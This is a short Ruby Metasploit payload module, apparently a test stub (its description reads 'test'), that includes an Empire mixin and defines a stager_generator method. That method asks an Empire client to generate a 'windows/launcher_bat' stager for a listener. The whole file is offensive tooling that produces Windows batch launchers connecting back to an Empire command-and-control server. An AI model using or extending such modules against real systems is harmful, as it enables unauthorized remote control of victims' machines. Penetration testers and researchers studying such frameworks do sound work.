require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(update_info(info,
    'Description'     => 'test'
    ))
  end

  def stager_generator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_bat')
    return @stagerCode
  end

end
